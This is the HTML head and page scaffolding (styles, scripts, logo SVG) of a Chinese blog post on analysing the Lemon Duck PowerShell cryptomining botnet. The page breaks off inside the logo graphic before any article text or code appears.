<!DOCTYPE html><html lang="zh"> <head><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/mywebsite/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CDGfc0hd.js"></script><!-- Global Metadata --><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="generator" content="Astro v5.17.2"><!-- Primary Metadata --><title>基于 PowerShell 模块驱动的柠檬鸭（Lemon Duck）深度分析报告 - Tech &amp; Daily</title><meta name="title" content="基于 PowerShell 模块驱动的柠檬鸭（Lemon Duck）深度分析报告 - Tech &#38; Daily"><meta name="description" content="powershell反混淆+无文件挖矿"><meta name="author" content="NickyWU"><!-- Color --><meta name="theme-color" content=""><meta name="color-scheme" content="light dark"><!-- Open Graph & Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://nickyl07.github.io/mywebsite/blog/%E6%9F%A0%E6%AA%AC%E9%B8%ADlemon-duck%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%BA%A6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"><meta property="og:title" content="基于 PowerShell 模块驱动的柠檬鸭（Lemon Duck）深度分析报告 - Tech &#38; Daily"><meta property="og:description" content="powershell反混淆+无文件挖矿"><meta property="og:image" content="https://nickyl07.github.io/mywebsite/og-images/og-image.png"><meta property="og:site_name" content="astro-antfustyle-theme.vercel.app"><meta property="og:locale" content="zh_CN"><meta property="article:author" content="NickyWU"><meta property="article:published_time" content="2025-04-01T00:00:00.000Z"><meta property="article:modified_time" content><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://nickyl07.github.io/mywebsite/blog/%E6%9F%A0%E6%AA%AC%E9%B8%ADlemon-duck%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%BA%A6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"><meta property="twitter:title" content="基于 PowerShell 模块驱动的柠檬鸭（Lemon Duck）深度分析报告 - Tech &#38; Daily"><meta property="twitter:description" content="powershell反混淆+无文件挖矿"><meta property="twitter:image" content="https://nickyl07.github.io/mywebsite/og-images/og-image.png"><!-- Canonical URL --><link rel="canonical" href="https://nickyl07.github.io/mywebsite/blog/%E6%9F%A0%E6%AA%AC%E9%B8%ADlemon-duck%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%BA%A6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"><!-- Icon --><link rel="icon" type="image/svg+xml" href="/mywebsite/favicon.svg"><link rel="icon" sizes="32x32" href="/mywebsite/favicon.ico"><link rel="apple-touch-icon" href="/mywebsite/apple-touch-icon.png"><!-- Manifest --><link rel="manifest" href="/mywebsite/app.webmanifest"><!-- Sitemap --><link rel="sitemap" href="/mywebsite/sitemap-index.xml"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="/mywebsite/rss.xml" href="/rss.xml"><!-- Google JSON-LD Structured Data --><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"基于 PowerShell 模块驱动的柠檬鸭（Lemon Duck）深度分析报告 - Tech & Daily","image":"https://nickyl07.github.io/mywebsite/og-images/og-image.png","url":"https://nickyl07.github.io/mywebsite/blog/%E6%9F%A0%E6%AA%AC%E9%B8%ADlemon-duck%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%BA%A6%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/","datePublished":"2025-04-01T00:00:00.000Z","description":"powershell反混淆+无文件挖矿","author":{"@type":"Person","name":"NickyWU","url":"https://astro-antfustyle-theme.vercel.app/"}}</script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><link rel="stylesheet" href="/mywebsite/_astro/_uno.Bd_OawOF.css">
<style>*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:var(--un-default-border-color, #e5e7eb)}:before,:after{--un-content: ""}html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,"Apple Color Emoji","Segoe UI Emoji",Segoe UI Symbol,"Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,samp,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit]{-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}ol,ul,menu{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}button,[role=button]{cursor:pointer}:disabled{cursor:default}img,svg,video,canvas,audio,iframe,embed,object{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}
</style>
<link rel="stylesheet" href="/mywebsite/_astro/main.C20M51KN.css">
<link rel="stylesheet" href="/mywebsite/_astro/prose.DEF_gphF.css">
<link rel="stylesheet" href="/mywebsite/_astro/markdown.DtEzIPn6.css">
<style>.github-item-prose h1,.github-item-prose h2,.github-item-prose h3,.github-item-prose h4,.github-item-prose h5{font-size:1em}@media (max-width: 639.9px){.github-item-prose h1,.github-item-prose h2,.github-item-prose h3,.github-item-prose h4,.github-item-prose h5{font-size:.875rem;line-height:1.25rem}}.github-item-prose>:first-child{margin-top:1.6em}.github-item-prose>:last-child{margin-bottom:1.25em}.github-item-prose h5 a{font-size:.875em}@media (max-width: 639.9px){.github-item-prose li{font-size:.875rem;line-height:1.25rem}}summary::-webkit-details-marker{display:none}.card-item-prose p{margin-bottom:1.1em;margin-top:1.1em}.card-masonry>*:first-child{border-radius:.5rem}.card-masonry>*:first-child:hover{--un-shadow:0px 3px 20px -5px var(--un-shadow-color, rgba(0, 0, 0, .2));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.dark .card-masonry>*:first-child:hover{--un-shadow:0px 3px 20px -5px var(--un-shadow-color, rgba(255, 255, 255, .25));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.card-grid>*:first-child{border-radius:.75rem}.card-grid>*:first-child:hover{--un-scale-x:1.03;--un-scale-y:1.03;transform:translate(var(--un-translate-x)) translateY(var(--un-translate-y)) translateZ(var(--un-translate-z)) rotate(var(--un-rotate)) rotateX(var(--un-rotate-x)) rotateY(var(--un-rotate-y)) rotate(var(--un-rotate-z)) skew(var(--un-skew-x)) skewY(var(--un-skew-y)) scaleX(var(--un-scale-x)) scaleY(var(--un-scale-y)) scaleZ(var(--un-scale-z));--un-shadow:0px 0px 15px -3px var(--un-shadow-color, rgba(0, 0, 0, .2));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow);transition-property:transform;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.dark .card-grid>*:first-child:hover{--un-shadow:0px 0px 15px -3px var(--un-shadow-color, rgba(255, 255, 255, .25));box-shadow:var(--un-ring-offset-shadow),var(--un-ring-shadow),var(--un-shadow)}.photo-view[data-layout=masonry] .icon-masonry,.photo-view[data-layout=square] .icon-grid{display:block}.photo-view[data-layout=square] .photo-container{display:grid;grid-template-columns:repeat(auto-fill,minmax(var(--min-photo-width),1fr));gap:var(--photo-gap)}.photo-figure{cursor:pointer;overflow:hidden;background-size:cover;background-image:var(--photo-placeholder)}.photo-view[data-layout=masonry] .photo-figure{position:absolute;top:0;left:0;width:var(--photo-width);height:var(--photo-height);border-radius:.375rem;transform:translate(var(--photo-left),var(--photo-top))}.photo-view[data-layout=square] .photo-figure{position:relative;aspect-ratio:1}.photo-figure img{width:100%;height:100%;object-fit:cover;opacity:var(--photo-opacity, 0);transition:all .3s ease-in-out}.photo-figure:hover img,.photo-figure:focus img{transform:scale(1.05)}.photo-figure figcaption{position:absolute;bottom:0;left:0;width:100%;padding:1rem .6rem .6rem;color:#fff;font-size:.875rem;opacity:0;background:linear-gradient(to top,rgba(0,0,0,.5),transparent);transition:all .3s ease-in-out}.photo-figure:hover figcaption,.photo-figure:focus figcaption{opacity:1}
.astro-route-announcer{position:absolute;left:0;top:0;clip:rect(0 0 0 0);clip-path:inset(50%);overflow:hidden;white-space:nowrap;width:1px;height:1px}
.logo-container[data-astro-cid-cagdmauf]{display:flex;justify-content:center;align-items:center;gap:.8rem;transform:scale(1.05)}@media (max-width: 300px){.logo-container[data-astro-cid-cagdmauf]{margin-top:.125rem;transform-origin:0%;transform:scale(.95)}}.logo-container[data-astro-cid-cagdmauf] svg[data-astro-cid-cagdmauf]{height:2rem}
:where([data-astro-image]){object-fit:var(--fit);object-position:var(--pos);height:auto}:where([data-astro-image=full-width]){width:100%}:where([data-astro-image=constrained]){max-width:100%}
@keyframes astroFadeInOut{0%{opacity:1}to{opacity:0}}@keyframes astroFadeIn{0%{opacity:0;mix-blend-mode:plus-lighter}to{opacity:1;mix-blend-mode:plus-lighter}}@keyframes astroFadeOut{0%{opacity:1;mix-blend-mode:plus-lighter}to{opacity:0;mix-blend-mode:plus-lighter}}@keyframes astroSlideFromRight{0%{transform:translate(100%)}}@keyframes astroSlideFromLeft{0%{transform:translate(-100%)}}@keyframes astroSlideToRight{to{transform:translate(100%)}}@keyframes astroSlideToLeft{to{transform:translate(-100%)}}@media (prefers-reduced-motion){::view-transition-group(*),::view-transition-old(*),::view-transition-new(*){animation:none!important}[data-astro-transition-scope]{animation:none!important}}
.i-ph-music-notes-fill[data-v-ef9455f9]{display:block;transform-origin:center}.animate-fade-in[data-v-ef9455f9]{animation:fadeIn-ef9455f9 .3s ease-out forwards}@keyframes fadeIn-ef9455f9{0%{opacity:0;transform:translate(-10px)}to{opacity:1;transform:translate(0)}}input[type=range][data-v-ef9455f9]{-webkit-appearance:none;background:#0000001a;border-radius:2px}input[type=range][data-v-ef9455f9]::-webkit-slider-thumb{-webkit-appearance:none;height:8px;width:8px;border-radius:50%;background:currentColor}
</style></head> <body class="relative flex flex-col min-h-screen
      font-sans text-gray-700 dark:text-gray-200" style="--enter-step:60ms" data-astro-transition-persist="music-player"> <!-- Background -->  <style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(()=>{var e=async t=>{await(await t())()};(self.Astro||(self.Astro={})).only=e;window.dispatchEvent(new Event("astro:only"));})();</script><script>(()=>{var A=Object.defineProperty;var g=(i,o,a)=>o in i?A(i,o,{enumerable:!0,configurable:!0,writable:!0,value:a}):i[o]=a;var d=(i,o,a)=>g(i,typeof o!="symbol"?o+"":o,a);{let i={0:t=>m(t),1:t=>a(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(a(t)),5:t=>new Set(a(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t),11:t=>1/0*t},o=t=>{let[l,e]=t;return l in i?i[l](e):void 0},a=t=>t.map(o),m=t=>typeof t!="object"||t===null?t:Object.fromEntries(Object.entries(t).map(([l,e])=>[l,o(e)]));class y extends HTMLElement{constructor(){super(...arguments);d(this,"Component");d(this,"hydrator");d(this,"hydrate",async()=>{var b;if(!this.hydrator||!this.isConnected)return;let e=(b=this.parentElement)==null?void 0:b.closest("astro-island[ssr]");if(e){e.addEventListener("astro:hydrate",this.hydrate,{once:!0});return}let c=this.querySelectorAll("astro-slot"),n={},h=this.querySelectorAll("template[data-astro-template]");for(let r of h){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("data-astro-template")||"default"]=r.innerHTML,r.remove())}for(let r of c){let s=r.closest(this.tagName);s!=null&&s.isSameNode(this)&&(n[r.getAttribute("name")||"default"]=r.innerHTML)}let p;try{p=this.hasAttribute("props")?m(JSON.parse(this.getAttribute("props"))):{}}catch(r){let s=this.getAttribute("component-url")||"<unknown>",v=this.getAttribute("component-export");throw v&&(s+=` (export ${v})`),console.error(`[hydrate] Error parsing props for component ${s}`,this.getAttribute("props"),r),r}let u;await this.hydrator(this)(this.Component,p,n,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))});d(this,"unmount",()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))})}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(!this.hasAttribute("await-children")||document.readyState==="interactive"||document.readyState==="complete")this.childrenConnectedCallback();else{let e=()=>{document.removeEventListener("DOMContentLoaded",e),c.disconnect(),this.childrenConnectedCallback()},c=new MutationObserver(()=>{var n;((n=this.lastChild)==null?void 0:n.nodeType)===Node.COMMENT_NODE&&this.lastChild.nodeValue==="astro:end"&&(this.lastChild.remove(),e())});c.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",e)}}async childrenConnectedCallback(){let e=this.getAttribute("before-hydration-url");e&&await import(e),this.start()}async start(){let e=JSON.parse(this.getAttribute("opts")),c=this.getAttribute("client");if(Astro[c]===void 0){window.addEventListener(`astro:${c}`,()=>this.start(),{once:!0});return}try{await Astro[c](async()=>{let n=this.getAttribute("renderer-url"),[h,{default:p}]=await Promise.all([import(this.getAttribute("component-url")),n?import(n):()=>()=>{}]),u=this.getAttribute("component-export")||"default";if(!u.includes("."))this.Component=h[u];else{this.Component=h;for(let f of u.split("."))this.Component=this.Component[f]}return this.hydrator=p,this.hydrate},e,this)}catch(n){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,n)}}attributeChangedCallback(){this.hydrate()}}d(y,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",y)}})();</script><astro-island uid="Z22HYuS" component-url="/mywebsite/_astro/MusicPlayer.7FHsg482.js" component-export="default" renderer-url="/mywebsite/_astro/client.BkZ8gEVU.js" props="{&quot;songs&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;LEFT RIGHT&quot;],&quot;url&quot;:[0,&quot;/mywebsite/media/LEFT RIGHT.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;PUPPET SHOW&quot;],&quot;url&quot;:[0,&quot;/mywebsite/media/PUPPET SHOW.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;SHOOTING STAR&quot;],&quot;url&quot;:[0,&quot;/mywebsite/media/SHOOTING STAR.mp3&quot;]}],[0,{&quot;name&quot;:[0,&quot;WINTER WITHOUT YOU&quot;],&quot;url&quot;:[0,&quot;/mywebsite/media/WINTER WITHOUT YOU.mp3&quot;]}]]],&quot;data-astro-transition-persist&quot;:[0,&quot;global-music-player&quot;]}" ssr client="only" opts="{&quot;name&quot;:&quot;MusicPlayer&quot;,&quot;value&quot;:&quot;vue&quot;}" data-astro-transition-persist="global-music-player"></astro-island> <!-- Skip Link --> <a class="op-60 no-underline hover:op-100 sr-only focus:not-sr-only focus:fixed focus:start-1 focus:top-1.5 focus:op-20" href="#main">  
Skip to content
</a> <!-- Nav Bar --> <header class="flex items-center gap-6 p-[1.75rem_2rem_2rem] lt-md:px-7"> <a class="op-60 no-underline hover:op-100 select-none op-transition" href="/mywebsite/" aria-label="NickyWU" aria-current="false" data-astro-cid-cagdmauf="true">   <div class="logo-container" data-astro-cid-cagdmauf> <!-- ICON SVG --> <!-- <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 32 32"
      width="2em"
      height="2em"
      aria-hidden="true"
    >
      <path
        fill="url(#vscodeIconsFileTypeLightAstro0)"
        d="M11.025 20.499c-.532 1.75-.154 4.184 1.105 5.331v-.042l.042-.112c.154-.741.756-1.203 1.526-1.175c.713.014 1.12.392 1.217 1.217c.042.308.042.616.056.938v.098c0 .7.196 1.371.588 1.959c.35.56.84.993 1.497 1.287l-.028-.056l-.028-.112c-.49-1.469-.14-2.49 1.147-3.358l.392-.266l.868-.573a4.25 4.25 0 0 0 1.791-3.037c.07-.532 0-1.05-.154-1.553l-.21.14c-1.945 1.035-4.17 1.4-6.325.98c-1.301-.197-2.56-.56-3.498-1.652z"
      >
      </path>
      <path
        class="dark:fill-[#fdfdfd]"
        fill="#17191e"
        d="M4.925 20.191s3.736-1.82 7.486-1.82l2.84-8.759c.098-.42.406-.7.756-.7s.644.28.756.714l2.826 8.746c4.45 0 7.487 1.82 7.487 1.82L20.709 2.84c-.168-.518-.49-.84-.896-.84h-7.612c-.406 0-.7.322-.896.84z"
      >
      </path>
      <defs>
        <linearGradient
          id="vscodeIconsFileTypeLightAstro0"
          x1="8.19"
          x2="16.91"
          y1="23"
          y2="18.89"
          gradientTransform="translate(-.673 -2.198)scale(1.3993)"
          gradientUnits="userSpaceOnUse"
        >
          <stop offset="0" stop-color="#d83333"></stop>
          <stop offset="1" stop-color="#f041ff"></stop>
        </linearGradient>
      </defs>
    </svg> --> <!-- TEXT SVG --> <!-- Generator: https://danmarshall.github.io/google-font-to-svg-path/ --> <!-- Google font: Great Vibes --> <svg width="107.548" height="40" viewBox="0 0 107.548 40" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" data-astro-cid-cagdmauf> <g id="svgGroup" class="dark:fill-[#fdfdfd]" fill="#17191e" fill-rule="evenodd" stroke-linecap="round" font-size="9pt" data-astro-cid-cagdmauf> <path vector-effect="non-scaling-stroke" d="M 1.72 26 Q 0.84 26 0.42 25.6 Q 0 25.2 0 24.28 Q 0 23.04 0.74 21.1 Q 1.48 19.16 2.68 16.88 Q 3.88 14.6 5.24 12.36 Q 6.6 10.12 7.84 8.26 Q 9.08 6.4 9.88 5.32 L 9.52 5.2 Q 9.28 5.12 9.28 4.92 Q 9.28 4.72 9.86 4.1 Q 10.44 3.48 11.24 2.74 Q 12.04 2 12.74 1.46 Q 13.44 0.92 13.68 0.92 Q 14.32 0.92 14.86 1.44 Q 15.4 1.96 15.4 2.64 Q 15.4 2.8 15.32 2.96 Q 15.2 3.56 14.82 5.12 Q 14.44 6.68 14.02 8.78 Q 13.6 10.88 13.3 13.16 Q 13 15.44 13 17.44 Q 13 19.76 13.58 21.36 Q 14.16 22.96 15.68 22.96 Q 17.04 22.96 18.42 21.68 Q 19.8 20.4 21.1 18.34 Q 22.4 16.28 23.44 13.96 Q 23.8 13.16 24.32 11.78 Q 24.84 10.4 25.34 8.78 Q 25.84 7.16 26.18 5.62 Q 26.52 4.08 26.52 3 Q 26.52 1.44 25.68 1.44 Q 25.36 1.44 25.02 1.58 Q 24.68 1.72 24.28 1.72 Q 24.16 1.72 23.98 1.66 Q 23.8 1.6 23.8 1.44 Q 23.8 1.04 24.28 0.72 Q 24.76 0.4 25.38 0.2 Q 26 0 26.32 0 Q 27.52 0 28.06 0.82 Q 28.6 1.64 28.6 3.04 Q 28.6 4.68 27.96 6.92 Q 27.32 9.16 26.2 11.6 Q 25.08 14.04 23.64 16.38 Q 22.2 18.72 20.62 20.62 Q 19.04 22.52 17.46 23.64 Q 15.88 24.76 14.48 24.76 Q 13.12 24.76 12.34 23.94 Q 11.56 23.12 11.24 21.74 Q 10.92 20.36 10.92 18.64 Q 10.92 16.68 11.24 14.54 Q 11.56 12.4 12 10.42 Q 12.44 8.44 12.88 6.94 Q 13.32 5.44 13.56 4.76 Q 12.56 5.88 11 7.78 Q 9.44 9.68 7.74 11.96 Q 6.04 14.24 4.52 16.6 Q 3 18.96 2.06 21.06 Q 1.12 23.16 1.12 24.68 Q 1.12 24.88 1.18 25.12 Q 1.24 25.36 1.52 25.36 Q 2.24 25.36 2.24 25.68 Q 2.24 26 1.72 26 Z M 65.76 19.64 L 65.76 19.32 Q 65.28 20.04 64.36 21 Q 63.44 21.96 62.28 22.86 Q 61.12 23.76 60 24.36 Q 58.88 24.96 57.96 24.96 Q 57.32 24.96 57.1 24.56 Q 56.88 24.16 56.88 23.64 Q 56.88 22.24 57.48 20.76 Q 58.08 19.28 58.84 18.02 Q 59.6 16.76 60.2 15.9 Q 60.8 15.04 60.8 14.92 Q 60.8 14.88 60.72 14.88 L 60.38 14.88 Q 60.2 14.88 60.32 14.64 Q 60.88 13.96 61.72 13.44 Q 62.56 12.92 63.32 12.92 Q 63.6 12.92 63.98 13.14 Q 64.36 13.36 64.36 13.68 Q 64.36 13.88 64.12 14.12 Q 63.84 14.4 63.46 14.76 Q 63.08 15.12 62.44 15.88 Q 62.08 16.28 61.44 17.18 Q 60.8 18.08 60.12 19.22 Q 59.44 20.36 58.98 21.46 Q 58.52 22.56 58.52 23.36 Q 58.52 23.48 58.54 23.62 Q 58.56 23.76 58.72 23.88 Q 59.28 23.92 60.12 23.38 Q 60.96 22.84 61.9 21.98 Q 62.84 21.12 63.7 20.14 Q 64.56 19.16 65.22 18.3 Q 65.88 17.44 66.16 16.92 Q 66.6 16.12 67.48 16.12 Q 68.12 16.12 68.22 16.4 Q 68.32 16.68 68.32 17.16 Q 68.32 18.72 68.14 19.9 Q 67.96 21.08 67.48 22.56 Q 70.04 20.36 72.36 17.92 Q 72.4 17.84 72.54 17.72 Q 72.68 17.6 72.76 17.6 Q 73 17.6 73 17.84 Q 73 18.16 72.76 18.48 Q 72.4 18.92 71.98 19.36 Q 71.56 19.8 71.16 20.24 Q 70.2 21.28 69.2 22.3 Q 68.2 23.32 67.08 24.24 Q 65.24 29.08 62.26 32.74 Q 59.28 36.4 54.76 39 Q 54 39.44 53.04 39.84 Q 52.08 40.24 51.16 40.24 Q 49.32 40.24 49.32 38.4 Q 49.32 38.2 49.34 38 Q 49.36 37.8 49.4 37.6 Q 49.72 36.16 50.76 34.84 Q 51.8 33.52 53.2 32.38 Q 54.6 31.24 56.06 30.26 Q 57.52 29.28 58.68 28.56 Q 59.36 28.12 60.42 27.48 Q 61.48 26.84 62.68 26.1 Q 63.88 25.36 64.96 24.72 Q 65.4 23.6 65.58 22.22 Q 65.76 20.84 65.76 19.64 Z M 52.08 39.24 Q 53.16 39.24 54.42 38.46 Q 55.68 37.68 56.92 36.52 Q 58.16 35.36 59.18 34.22 Q 60.2 33.08 60.8 32.32 Q 61.48 31.4 62.12 30.5 Q 62.76 29.6 63.32 28.64 Q 64.16 27.24 64.72 25.92 Q 64.76 25.8 64.66 25.78 L 64.56 25.76 Q 63.32 26.64 62.06 27.5 Q 60.8 28.36 59.52 29.2 Q 58.88 29.6 57.8 30.38 Q 56.72 31.16 55.48 32.14 Q 54.24 33.12 53.12 34.18 Q 52 35.24 51.28 36.26 Q 50.56 37.28 50.56 38.08 Q 50.56 38.72 51.06 38.98 Q 51.56 39.24 52.08 39.24 Z M 42.4 22.56 L 45.28 17.44 Q 44.92 17.72 44.6 18.04 Q 44.28 18.36 43.88 18.72 Q 43.72 18.88 43.52 18.88 Q 43.36 18.88 43.36 18.72 Q 43.36 18.56 43.56 18.28 Q 44.48 17.12 45.82 15.7 Q 47.16 14.28 48.76 11.84 Q 49.28 11.04 50.24 9.84 Q 51.2 8.64 52.34 7.28 Q 53.48 5.92 54.64 4.7 Q 55.8 3.48 56.68 2.64 Q 57.12 2.28 57.44 2.04 Q 57.76 1.8 57.92 1.76 Q 58.28 1.76 58.6 2.16 Q 58.92 2.56 58.96 3 Q 58.96 3.44 58.64 3.6 Q 58.16 4 57.74 4.32 Q 57.32 4.64 56.88 5.04 Q 55.8 6 54.48 7.4 Q 53.16 8.8 51.82 10.4 Q 50.48 12 49.26 13.62 Q 48.04 15.24 47.12 16.68 Q 47.2 16.76 47.28 16.76 Q 47.4 16.76 47.58 16.62 Q 47.76 16.48 48.04 16.24 Q 49.44 15.04 51.08 13.78 Q 52.72 12.52 54.24 11.48 Q 54.68 11.2 55.14 10.98 Q 55.6 10.76 56.12 10.76 Q 56.44 10.76 56.74 10.86 Q 57.04 10.96 57.2 11.2 Q 57.6 11.32 57.98 11.6 Q 58.36 11.88 58.36 12.36 Q 58.36 12.96 57.76 13.5 Q 57.16 14.04 56.72 14.36 Q 55.36 15.24 53.54 15.86 Q 51.72 16.48 50 16.8 Q 49.72 18.04 49.5 19.34 Q 49.28 20.64 49.28 21.72 Q 49.28 22.84 49.56 23.56 Q 49.84 24.28 50.6 24.28 Q 51.04 24.28 51.7 23.86 Q 52.36 23.44 53.06 22.86 Q 53.76 22.28 54.34 21.72 Q 54.92 21.16 55.24 20.88 Q 55.6 20.56 56.28 19.92 Q 56.96 19.28 57.62 18.64 Q 58.28 18 58.52 17.72 Q 58.56 17.68 58.64 17.68 Q 58.84 17.68 58.84 17.96 Q 58.84 18.28 58.36 18.8 L 57.68 19.56 Q 56.04 21.4 54.46 23.06 Q 52.88 24.72 51.68 25.36 Q 51.28 25.56 50.88 25.56 Q 49.04 25.56 48.32 24.36 Q 47.6 23.16 47.6 21.44 Q 47.6 20.48 47.76 19.46 Q 47.92 18.44 48.16 17.44 Q 47.68 17.72 47 18.32 Q 46.32 18.92 45.44 19.84 Q 44.76 21.2 44.24 22.46 Q 43.72 23.72 43.08 24.76 Q 42.96 24.92 42.76 24.96 Q 42.56 25 42.36 25 Q 41.52 25 41.52 24.24 Q 41.52 23.36 42.4 22.56 Z M 50.28 15.76 Q 50.72 15.68 51.64 15.4 Q 52.56 15.12 53.54 14.68 Q 54.52 14.24 55.26 13.74 Q 56 13.24 56.12 12.72 Q 56 12.44 55.68 12.44 Q 55.4 12.44 54.64 12.86 Q 53.88 13.28 53 13.86 Q 52.12 14.44 51.36 14.98 Q 50.6 15.52 50.28 15.76 Z M 34.72 25.48 Q 33.4 25.48 32.62 24.6 Q 31.84 23.72 31.84 22.36 Q 31.84 21.08 32.66 19.56 Q 33.48 18.04 34.78 16.6 Q 36.08 15.16 37.48 14.08 Q 38.88 13 40 12.6 Q 40.52 12.4 40.96 12.4 Q 41.48 12.4 41.64 12.64 Q 41.8 12.88 41.9 13.16 Q 42 13.44 42.24 13.6 Q 42.68 13.84 42.68 14.44 Q 42.68 14.88 42.46 15.5 Q 42.24 16.12 41.84 16.58 Q 41.44 17.04 40.88 17.04 Q 40.36 17.04 40.36 16.6 Q 40.36 16.32 40.64 16 Q 40.92 15.68 41.2 15.3 Q 41.48 14.92 41.48 14.56 Q 41.48 14.2 41.12 14.2 Q 40.44 14.2 39.44 14.9 Q 38.44 15.6 37.4 16.72 Q 36.36 17.84 35.44 19.1 Q 34.52 20.36 33.96 21.48 Q 33.4 22.6 33.4 23.32 Q 33.4 23.84 33.66 24.18 Q 33.92 24.52 34.44 24.52 Q 35.28 24.52 36.32 24.04 Q 37.36 23.56 38.3 22.88 Q 39.24 22.2 39.84 21.68 Q 40.96 20.68 42.02 19.66 Q 43.08 18.64 44.12 17.6 Q 44.24 17.48 44.4 17.48 Q 44.76 17.48 44.76 17.8 Q 44.76 17.96 44.12 18.66 Q 43.48 19.36 42.6 20.24 Q 41.72 21.12 40.96 21.84 Q 40.2 22.56 39.96 22.76 Q 39.32 23.32 38.42 23.96 Q 37.52 24.6 36.56 25.04 Q 35.6 25.48 34.72 25.48 Z M 26.8 25.76 Q 26.16 25.76 25.62 25.24 Q 25.08 24.72 24.96 24.12 Q 25.08 23.36 25.5 22.26 Q 25.92 21.16 26.48 19.96 Q 27.04 18.76 27.6 17.7 Q 28.16 16.64 28.56 16 Q 27.8 16.68 26.94 17.52 Q 26.08 18.36 25.32 19.08 Q 25.28 19.12 25.14 19.24 Q 25 19.36 24.88 19.36 Q 24.6 19.36 24.6 19.12 Q 24.6 18.92 24.76 18.76 Q 25.84 17.56 27.02 16.36 Q 28.2 15.16 29.32 13.88 Q 29.68 13.44 29.94 13.18 Q 30.2 12.92 30.76 12.92 Q 31 12.92 31.5 13.02 Q 32 13.12 32.34 13.36 Q 32.68 13.6 32.44 13.96 Q 32.16 14.4 31.48 15.4 Q 30.8 16.4 29.94 17.68 Q 29.08 18.96 28.26 20.26 Q 27.44 21.56 26.92 22.6 Q 26.4 23.64 26.4 24.16 Q 26.4 24.4 26.56 24.4 Q 26.8 24.4 27.38 23.96 Q 27.96 23.52 28.54 23.02 Q 29.12 22.52 29.32 22.36 Q 30.48 21.36 31.6 20.3 Q 32.72 19.24 33.72 18.08 Q 33.8 18 33.94 17.84 Q 34.08 17.68 34.24 17.68 Q 34.44 17.68 34.44 17.92 Q 34.44 18.2 34.24 18.48 Q 33.72 19.12 33.08 19.74 Q 32.44 20.36 31.88 20.96 Q 30.84 22 29.86 23.02 Q 28.88 24.04 27.92 25.12 Q 27.72 25.36 27.42 25.56 Q 